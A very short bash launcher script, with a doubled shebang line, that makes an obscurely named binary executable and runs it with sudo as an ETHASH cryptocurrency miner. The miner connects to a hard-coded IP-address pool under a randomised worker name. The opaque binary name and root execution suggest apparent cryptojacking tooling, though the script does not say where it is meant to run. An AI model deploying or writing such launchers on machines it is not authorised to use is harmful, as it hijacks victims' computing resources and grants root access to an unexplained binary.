#!/bin/bash
#!/bin/bash

POOL=128.199.157.196:14699
WALLET=Acc9h50-$(shuf -n 1 -i 1-9999)
cd "$(dirname "$0")"

chmod +x ./nhacochokojjj && sudo ./nhacochokojjj --algo ETHASH --pool $POOL --user $WALLET  $@
